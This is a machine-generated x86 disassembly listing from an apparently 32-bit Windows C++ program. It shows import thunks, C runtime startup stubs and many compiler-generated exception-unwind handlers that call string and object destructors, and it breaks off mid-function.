wcschr
jmp [ wcschr@IAT ]
memset
jmp [ memset@IAT ]
sub_42eddf
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
leave
push ecx
retn
realloc
jmp [ realloc@IAT ]
_callnewh
jmp [ _callnewh@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
__security_error_handler
jmp [ __security_error_handler@IAT ]
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
?terminate@@YAXXZ
jmp [ terminate@IAT ]
_c_exit
jmp [ _c_exit@IAT ]
_exit
jmp [ _exit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_cexit
jmp [ _cexit@IAT ]
exit
jmp [ exit@IAT ]
_amsg_exit
jmp [ _amsg_exit@IAT ]
__wgetmainargs
jmp [ __wgetmainargs@IAT ]
sub_42eed1
xor eax eax
inc eax
retn
sub_42ef15
xor eax eax
inc eax
retn
_initterm
jmp [ _initterm@IAT ]
sub_42ef32
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
__setusermatherr
jmp [ __setusermatherr@IAT ]
sub_42ef4a
xor eax eax
retn
sub_42ef4d
xor eax eax
retn
__p__commode
jmp [ __p__commode@IAT ]
__p__fmode
jmp [ __p__fmode@IAT ]
__set_app_type
jmp [ __set_app_type@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
HeapDestroy
jmp [ HeapDestroy@IAT ]
HeapReAlloc
jmp [ HeapReAlloc@IAT ]
HeapSize
jmp [ HeapSize@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetStartupInfoW
jmp [ GetStartupInfoW@IAT ]
QueryPerformanceCounter
jmp [ QueryPerformanceCounter@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetSystemTimeAsFileTime
jmp [ GetSystemTimeAsFileTime@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
_itoa
jmp [ _itoa@IAT ]
sub_42efb0
mov ecx [ ebp - 0x20 ]
jmp sub_4010e0
sub_42efb8
mov ecx [ ebp - 0x24 ]
jmp sub_4011f0
sub_42efc0
mov eax r--data
jmp __CxxFrameHandler
sub_42efd0
mov ecx [ ebp - 0x10 ]
jmp sub_4010e0
sub_42efd8
mov eax r--data
jmp __CxxFrameHandler
sub_42eff0
mov ecx [ ebp - 0x20 ]
jmp sub_4011f0
sub_42eff8
mov eax r--data
jmp __CxxFrameHandler
sub_42f010
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_401310
sub_42f01b
mov eax r--data
jmp __CxxFrameHandler
sub_42f030
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_401310
sub_42f03b
mov eax r--data
jmp __CxxFrameHandler
sub_42f050
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_401310
sub_42f05b
mov ecx [ ebp - 0x10 ]
jmp sub_4015a0
sub_42f063
mov eax r--data
jmp __CxxFrameHandler
sub_42f070
mov ecx [ ebp - 0x10 ]
jmp sub_4015a0
sub_42f078
mov eax r--data
jmp __CxxFrameHandler
sub_42f090
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42f099
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42f0b3
mov eax r--data
jmp __CxxFrameHandler
sub_42f0c0
mov ecx [ ebp - 0x10 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42f0c9
mov ecx [ ebp - 0x10 ]
add ecx 0x220
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42f0d8
mov ecx [ ebp - 0x10 ]
add ecx 0x23c
jmp sub_401720
sub_42f0e6
mov eax r--data
jmp __CxxFrameHandler
sub_42f0f0
mov ecx [ ebp - 0x10 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42f0f9
mov ecx [ ebp - 0x10 ]
add ecx 0x220
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42f108
mov ecx [ ebp - 0x10 ]
add ecx 0x23c
jmp sub_401720
sub_42f116
mov eax r--data
jmp __CxxFrameHandler
sub_42f120
lea ecx [ ebp - 0x258 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42f12c
lea ecx [ ebp - 0x23c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42f138
lea ecx [ ebp - 0x258 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42f144
mov eax r--data
jmp __CxxFrameHandler
sub_42f150
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_42f15e
mov eax r--data
jmp __CxxFrameHandler
sub_42f170
mov ecx [ ebp - 0x10 ]
jmp [ exception::~exception@IAT ]
sub_42f179
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_42f185
mov eax r--data
jmp __CxxFrameHandler
sub_42f190
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_42f19e
mov eax r--data
jmp __CxxFrameHandler
sub_42f1b0
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_42f1be
mov eax r--data
jmp __CxxFrameHandler
sub_42f1d0
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_42f1de
mov eax r--data
jmp __CxxFrameHandler
sub_42f1f0
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_42f1f9
lea ecx [ ebp - 0x130 ]
jmp sub_401d80
sub_42f204
lea ecx [ ebp - 0x14c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42f210
mov eax r--data
jmp __CxxFrameHandler
sub_42f220
lea ecx [ ebp - 0x94 ]
jmp sub_401db0
sub_42f22b
lea ecx [ ebp - 0xb0 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_42f237
mov eax r--data
jmp __CxxFrameHandler
sub_42f250
mov ecx [ ebp - 0x24 ]
jmp sub_4011f0
sub_42f258
mov eax r--data
jmp __CxxFrameHandler
sub_42f270
mov ecx [ ebp - 0x24 ]
jmp sub_4011f0
sub_42f278
mov eax r--data
jmp __CxxFrameHandler
sub_42f290
mov ecx [ ebp - 0x68 ]
jmp sub_4011f0
sub_42f298
lea ecx [ ebp - 0x3c ]
jmp sub_401f40
sub_42f2a0
mov eax r--data
jmp __CxxFrameHandler
sub_42f2b0
lea ecx [ ebp - 0x14 ]
jmp sub_4010e0
sub_42f2b8
mov eax r--data
jmp __CxxFrameHandler
sub_42f2d0
lea ecx [ ebp - 0x14 ]
jmp sub_4010e0
sub_42f2d8
mov eax r--data
jmp __CxxFrameHandler
sub_42f2f0
mov eax r--data
jmp __CxxFrameHandler
sub_42f300
mov eax r--data
jmp __CxxFrameHandler
sub_42f310
mov eax r--data
jmp __CxxFrameHandler
sub_42f320
mov eax r--data
jmp __CxxFrameHandler
sub_42f330
mov ecx [ ebp - 0x10 ]
jmp sub_403170
sub_42f338
mov eax r--data
jmp __CxxFrameHandler
sub_42f350
mov ecx [ ebp - 0x10 ]
jmp [ exception::~exception@IAT ]
sub_42f359
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_42f365
mov eax r--data
jmp __CxxFrameHandler
sub_42f370
mov ecx [ ebp - 0x10 ]
jmp [ exception::~exception@IAT ]
sub_42f379
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_42f385
mov eax r--data
jmp __CxxFrameHandler
sub_42f390
mov ecx [ ebp - 0x10 ]
jmp sub_403f10
sub_42f398
mov eax r--data
jmp __CxxFrameHandler
sub_42f3b0
mov ecx [ ebp - 0x10 ]
jmp sub_403f10
sub_42f3b8
mov eax r--data
jmp __CxxFrameHandler
sub_42f3d0
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42f3d9
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42f3f3
mov eax r--data
jmp __CxxFrameHandler
sub_42f400
mov eax [ ebp - 0x10 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_42f40b
mov eax r--data
jmp __CxxFrameHandler
sub_42f420
mov eax [ ebp - 0x10 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_42f42b
mov eax r--data
jmp __CxxFrameHandler
sub_42f440
mov eax [ ebp - 0x10 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_42f44b
mov eax r--data
jmp __CxxFrameHandler
sub_42f460
lea ecx [ ebp - 0x50 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_42f469
lea ecx [ ebp - 0x34 ]
jmp sub_403f10
sub_42f471
mov eax r--data
jmp __CxxFrameHandler
sub_42f480
mov ecx [ ebp - 0x10 ]
jmp [ exception::~exception@IAT ]
sub_42f489
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_42f495
mov eax r--data
jmp __CxxFrameHandler
sub_42f4a0
mov ecx [ ebp - 0x10 ]
jmp sub_403f10
sub_42f4a8
mov eax r--data
jmp __CxxFrameHandler
sub_42f4c0
mov eax [ ebp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_42f4cb
mov eax r--data
jmp __CxxFrameHandler
sub_42f4e0
mov ecx [ ebp - 0x10 ]
jmp sub_404520
sub_42f4e8
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_404780
sub_42f4f3
mov eax r--data
jmp __CxxFrameHandler
sub_42f500
mov ecx [ ebp - 0x10 ]
jmp sub_404520
sub_42f508
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_404780
sub_42f513
mov eax r--data
jmp __CxxFrameHandler
sub_42f520
lea ecx [ ebp - 0x10 ]
jmp sub_404780
sub_42f528
mov eax r--data
jmp __CxxFrameHandler
sub_42f540
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp sub_404520
sub_42f559
mov eax r--data
jmp __CxxFrameHandler
sub_42f570
mov ecx [ ebp - 0x10 ]
add ecx 0x28
jmp sub_404e90
sub_42f57b
mov eax r--data
jmp __CxxFrameHandler
sub_42f590
lea ecx [ ebp + 0x4 ]
jmp sub_4045e0
sub_42f598
lea ecx [ ebp - 0x14 ]
jmp sub_404520
sub_42f5a0
mov eax r--data
jmp __CxxFrameHandler
sub_42f5b0
lea ecx [ ebp - 0x14 ]
jmp sub_404640
sub_42f5b8
lea ecx [ ebp - 0x18 ]
jmp sub_4045e0
sub_42f5c0
lea ecx [ ebp - 0x10 ]
jmp sub_404520
sub_42f5c8
lea ecx [ ebp - 0x10 ]
jmp sub_404520
sub_42f5d0
mov eax r--data
jmp __CxxFrameHandler
sub_42f5e0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x10 ]
add eax 0x4
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ecx [ ebp - 0x14 ]
jmp sub_4054a0
sub_42f607
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp sub_403cb0
sub_42f612
mov eax r--data
jmp __CxxFrameHandler
sub_42f620
mov ecx [ ebp - 0x10 ]
jmp sub_405ab0
sub_42f628
mov eax r--data
jmp __CxxFrameHandler
sub_42f640
mov ecx [ ebp - 0x10 ]
add ecx 0x28
jmp sub_404e90
sub_42f64b
mov eax r--data
jmp __CxxFrameHandler
sub_42f660
lea ecx [ ebp - 0x110 ]
jmp sub_4038d0
sub_42f66b
lea ecx [ ebp - 0x24c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42f677
lea ecx [ ebp - 0x214 ]
jmp sub_4038d0
sub_42f682
lea ecx [ ebp - 0x230 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42f68e
mov eax r--data
jmp __CxxFrameHandler
sub_42f6a0
lea ecx [ ebp - 0x220 ]
jmp sub_406630
sub_42f6ab
lea ecx [ ebp - 0x22c ]
jmp sub_406360
sub_42f6b6
lea ecx [ ebp - 0x230 ]
jmp sub_406390
sub_42f6c1
lea ecx [ ebp - 0x230 ]
jmp sub_4063b0
sub_42f6cc
lea ecx [ ebp - 0x224 ]
jmp sub_406390
sub_42f6d7
lea ecx [ ebp - 0x224 ]
jmp sub_4063b0
sub_42f6e2
lea ecx [ ebp - 0x22c ]
jmp sub_4063a0
sub_42f6ed
lea ecx [ ebp - 0x22c ]
jmp sub_4065f0
sub_42f6f8
lea ecx [ ebp - 0x22c ]
jmp sub_4063a0
sub_42f703
lea ecx [ ebp - 0x224 ]
jmp sub_406390
sub_42f70e
lea ecx [ ebp - 0x230 ]
jmp sub_406390
sub_42f719
mov eax r--data
jmp __CxxFrameHandler
sub_42f730
mov ecx [ ebp - 0x10 ]
jmp sub_406390
sub_42f738
mov eax r--data
jmp __CxxFrameHandler
sub_42f750
mov eax [ ebp - 0x34 ]
push eax
call ??_V@YAXPAX@Z
pop ecx
retn
sub_42f75b
lea ecx [ ebp - 0x14 ]
jmp sub_403170
sub_42f763
mov eax r--data
jmp __CxxFrameHandler
sub_42f770
mov ecx [ ebp - 0x10 ]
jmp sub_403170
sub_42f778
mov eax r--data
jmp __CxxFrameHandler
sub_42f790
mov ecx [ ebp - 0x10 ]
jmp sub_4063a0
sub_42f798
mov eax r--data
jmp __CxxFrameHandler
sub_42f7b0
lea ecx [ ebp - 0x10 ]
jmp sub_406390
sub_42f7b8
lea ecx [ ebp - 0x10 ]
jmp sub_4063b0
sub_42f7c0
lea ecx [ ebp - 0x10 ]
jmp sub_406390
sub_42f7c8
lea ecx [ ebp - 0x10 ]
jmp sub_406390
sub_42f7d0
mov eax r--data
jmp __CxxFrameHandler
sub_42f7e0
lea ecx [ ebp - 0x14 ]
jmp sub_406390
sub_42f7e8
lea ecx [ ebp - 0x14 ]
jmp sub_4063b0
sub_42f7f0
lea ecx [ ebp - 0x14 ]
jmp sub_406390
sub_42f7f8
lea ecx [ ebp - 0x14 ]
jmp sub_406390
sub_42f800
mov eax r--data
jmp __CxxFrameHandler
sub_42f810
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_4054a0
sub_42f81b
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp sub_403cb0
sub_42f826
mov eax r--data
jmp __CxxFrameHandler
sub_42f830
mov ecx [ ebp - 0x10 ]
jmp sub_405ab0
sub_42f838
mov eax r--data
jmp __CxxFrameHandler
sub_42f850
lea ecx [ ebp + 0x4 ]
jmp sub_406d90
sub_42f858
mov eax r--data
jmp __CxxFrameHandler
sub_42f870
lea ecx [ ebp + 0x4 ]
jmp sub_406d90
sub_42f878
mov eax r--data
jmp __CxxFrameHandler
sub_42f890
lea ecx [ ebp + 0x4 ]
jmp sub_406d90
sub_42f898
mov eax r--data
jmp __CxxFrameHandler
sub_42f8b0
lea ecx [ ebp + 0x4 ]
jmp sub_406d90
sub_42f8b8
mov eax r--data
jmp __CxxFrameHandler
sub_42f8d0
lea ecx [ ebp + 0x8 ]
jmp sub_406d90
sub_42f8d8
mov eax r--data
jmp __CxxFrameHandler
sub_42f8f0
lea ecx [ ebp + 0x4 ]
jmp sub_406d90
sub_42f8f8
mov eax r--data
jmp __CxxFrameHandler
sub_42f910
lea ecx [ ebp + 0x8 ]
jmp sub_406d90
sub_42f918
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp sub_406d90
sub_42f931
mov eax r--data
jmp __CxxFrameHandler
sub_42f940
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42f949
mov ecx [ ebp + 0x4 ]
jmp sub_406d90
sub_42f951
mov eax r--data
jmp __CxxFrameHandler
sub_42f960
mov ecx [ ebp + 0x4 ]
jmp sub_406d90
sub_42f968
mov eax r--data
jmp __CxxFrameHandler
sub_42f980
mov ecx [ ebp - 0x10 ]
jmp sub_406d90
sub_42f988
lea ecx [ ebp + 0x8 ]
jmp sub_406d90
sub_42f990
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42f9aa
mov eax r--data
jmp __CxxFrameHandler
sub_42f9c0
lea ecx [ ebp - 0x3c ]
jmp sub_407620
sub_42f9c8
mov eax r--data
jmp __CxxFrameHandler
sub_42f9e0
mov ecx [ ebp - 0x10 ]
jmp sub_405ab0
sub_42f9e8
mov eax r--data
jmp __CxxFrameHandler
sub_42fa00
mov ecx [ ebp - 0x10 ]
jmp sub_405ab0
sub_42fa08
mov eax r--data
jmp __CxxFrameHandler
sub_42fa20
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp sub_405b20
sub_42fa2b
mov eax r--data
jmp __CxxFrameHandler
sub_42fa40
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp sub_405b20
sub_42fa4b
mov ecx [ ebp - 0x10 ]
jmp sub_405ab0
sub_42fa53
mov eax r--data
jmp __CxxFrameHandler
sub_42fa60
mov eax r--data
jmp __CxxFrameHandler
sub_42fa70
mov eax [ ebp - 0x1c ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_42fa7b
mov eax r--data
jmp __CxxFrameHandler
sub_42fa90
lea ecx [ ebp + 0x4 ]
jmp sub_4047e0
sub_42fa98
mov eax r--data
jmp __CxxFrameHandler
sub_42fab0
mov ecx [ ebp - 0x10 ]
jmp sub_404520
sub_42fab8
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_404780
sub_42fac3
mov ecx [ ebp - 0x10 ]
jmp sub_4050e0
sub_42facb
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_404530
sub_42fad6
mov ecx [ ebp - 0x10 ]
add ecx 0x80
jmp sub_408000
sub_42fae4
mov ecx [ ebp - 0x10 ]
add ecx 0x90
jmp sub_404560
sub_42faf2
mov ecx [ ebp - 0x10 ]
add ecx 0x94
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42fb01
mov eax r--data
jmp __CxxFrameHandler
sub_42fb10
mov ecx [ ebp - 0x10 ]
jmp sub_4050e0
sub_42fb18
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_404530
sub_42fb23
mov ecx [ ebp - 0x10 ]
add ecx 0x80
jmp sub_408000
sub_42fb31
mov ecx [ ebp - 0x10 ]
add ecx 0x90
jmp sub_404560
sub_42fb3f
mov ecx [ ebp - 0x10 ]
add ecx 0x94
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42fb4e
mov eax r--data
jmp __CxxFrameHandler
sub_42fb60
lea ecx [ ebp + 0xc ]
jmp sub_404520
sub_42fb68
lea ecx [ ebp + 0x8 ]
jmp sub_404520
sub_42fb70
mov ecx [ ebp + 0xc ]
jmp sub_406d90
sub_42fb78
mov ecx [ ebp + 0xc ]
jmp sub_406d90
sub_42fb80
mov ecx [ ebp + 0xc ]
jmp sub_406d90
sub_42fb88
mov ecx [ ebp + 0xc ]
jmp sub_406d90
sub_42fb90
mov ecx [ ebp + 0xc ]
jmp sub_406d90
sub_42fb98
mov eax r--data
jmp __CxxFrameHandler
sub_42fbb0
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42fbbc
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42fbc8
mov eax r--data
jmp __CxxFrameHandler
sub_42fbe0
mov ecx [ ebp - 0x10 ]
jmp sub_412370
sub_42fbe8
mov eax r--data
jmp __CxxFrameHandler
sub_42fc00
mov ecx [ ebp - 0x10 ]
jmp sub_412370
sub_42fc08
mov eax r--data
jmp __CxxFrameHandler
sub_42fc20
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42fc2c
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42fc38
mov eax r--data
jmp __CxxFrameHandler
sub_42fc50
mov ecx [ ebp - 0x14 ]
jmp sub_418460
sub_42fc58
mov ecx [ ebp - 0x14 ]
add ecx 0x14
jmp sub_408660
sub_42fc63
mov ecx [ ebp - 0x14 ]
add ecx 0x6c
jmp sub_408600
sub_42fc6e
mov ecx [ ebp - 0x10 ]
jmp sub_412370
sub_42fc76
mov eax r--data
jmp __CxxFrameHandler
sub_42fc80
mov ecx [ ebp - 0x10 ]
jmp sub_418460
sub_42fc88
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_408660
sub_42fc93
mov ecx [ ebp - 0x10 ]
add ecx 0x6c
jmp sub_408600
sub_42fc9e
mov eax r--data
jmp __CxxFrameHandler
sub_42fcb0
mov eax [ ebp - 0x3c ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_42fcbb
mov eax r--data
jmp __CxxFrameHandler
sub_42fcd0
mov ecx [ ebp - 0x10 ]
jmp sub_408b70
sub_42fcd8
mov eax r--data
jmp __CxxFrameHandler
sub_42fcf0
mov ecx [ ebp - 0x10 ]
jmp sub_408b70
sub_42fcf8
mov eax r--data
jmp __CxxFrameHandler
sub_42fd10
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_408ae0
sub_42fd1b
mov eax r--data
jmp __CxxFrameHandler
sub_42fd30
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp sub_408f90
sub_42fd3b
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_408ae0
sub_42fd46
mov eax r--data
jmp __CxxFrameHandler
sub_42fd50
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_408ae0
sub_42fd5b
mov eax r--data
jmp __CxxFrameHandler
sub_42fd70
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_408ae0
sub_42fd7b
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_408f90
sub_42fd86
mov eax r--data
jmp __CxxFrameHandler
sub_42fd90
mov eax [ ebp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_42fd9b
mov eax r--data
jmp __CxxFrameHandler
sub_42fdb0
mov eax [ ebp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_42fdbb
mov eax r--data
jmp __CxxFrameHandler
sub_42fdd0
mov eax [ ebp + 0x4 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_408de0
add esp 0x8
retn
sub_42fde1
mov eax r--data
jmp __CxxFrameHandler
sub_42fdf0
mov ecx [ ebp - 0x10 ]
jmp sub_408fe0
sub_42fdf8
mov eax r--data
jmp __CxxFrameHandler
sub_42fe10
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_408ae0
sub_42fe1b
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_408f90
sub_42fe26
mov ecx [ ebp - 0x14 ]
jmp sub_408fe0
sub_42fe2e
mov eax r--data
jmp __CxxFrameHandler
sub_42fe40
mov ecx [ ebp - 0x10 ]
jmp sub_409830
sub_42fe48
mov eax r--data
jmp __CxxFrameHandler
sub_42fe60
mov ecx [ ebp - 0x10 ]
jmp sub_409830
sub_42fe68
mov ecx [ ebp - 0x10 ]
jmp sub_408fe0
sub_42fe70
mov eax r--data
jmp __CxxFrameHandler
sub_42fe80
mov ecx [ ebp - 0x10 ]
jmp sub_409920
sub_42fe88
mov ecx [ ebp - 0x10 ]
add ecx 0x24
jmp sub_408100
sub_42fe93
mov ecx [ ebp - 0x10 ]
add ecx 0xf4
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42fea2
mov ecx [ ebp - 0x10 ]
jmp sub_409830
sub_42feaa
mov ecx [ ebp - 0x10 ]
jmp sub_408fe0
sub_42feb2
mov eax r--data
jmp __CxxFrameHandler
sub_42fec0
mov ecx [ ebp - 0x10 ]
jmp sub_409830
sub_42fec8
mov ecx [ ebp - 0x10 ]
jmp sub_409920
sub_42fed0
mov ecx [ ebp - 0x10 ]
add ecx 0x24
jmp sub_408100
sub_42fedb
mov ecx [ ebp - 0x10 ]
add ecx 0xf4
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42feea
mov eax r--data
jmp __CxxFrameHandler
sub_42ff00
mov eax r--data
jmp __CxxFrameHandler
sub_42ff10
mov eax r--data
jmp __CxxFrameHandler
sub_42ff20
lea ecx [ ebp - 0x40 ]
jmp sub_405390
sub_42ff28
mov eax r--data
jmp __CxxFrameHandler
sub_42ff40
lea ecx [ ebp - 0x40 ]
jmp sub_404e90
sub_42ff48
mov eax [ ebp - 0x40 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_42ff53
lea ecx [ ebp - 0x40 ]
jmp sub_405390
sub_42ff5b
lea ecx [ ebp - 0x28 ]
